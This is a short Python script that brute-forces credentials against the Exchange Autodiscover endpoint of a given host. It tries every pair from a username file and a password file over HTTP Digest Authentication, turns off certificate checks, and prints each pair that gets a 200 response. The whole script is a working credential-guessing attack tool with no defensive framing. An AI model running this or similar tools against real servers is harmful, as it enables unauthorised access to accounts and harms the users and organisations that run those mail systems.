import argparse
import requests
from requests.auth import HTTPDigestAuth
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_credentials_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def main():
    parser = argparse.ArgumentParser(description="Make a GET request with Digest Authentication")
    parser.add_argument("hostname", help="The hostname or URL to make the GET request to")
    parser.add_argument("username_file", help="Path to the file containing the usernames")
    parser.add_argument("password_file", help="Path to the file containing the passwords")
    args = parser.parse_args()

    hostname = args.hostname
    url = "https://" + hostname + "/autodiscover/autodiscover.xml"
    username_file = args.username_file
    password_file = args.password_file

    try:
        # Read the usernames and passwords from files
        usernames = get_credentials_from_file(username_file)
        passwords = get_credentials_from_file(password_file)

        # Create a session with Digest Authentication
        session = requests.Session()

        # Iterate through all combinations of users and passwords
        for username in usernames:
            for password in passwords:
                session.auth = HTTPDigestAuth(username, password)

                # Disable SSL certificate verification (for self-signed certificates)
                response = session.get(url, verify=False)

                # Check the response status code
                if response.status_code == 200:
                    pass
                    print(f"[+] {username} : {password}")
                else:
                    pass

    except FileNotFoundError:
        print("Error: Username or password file not found.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
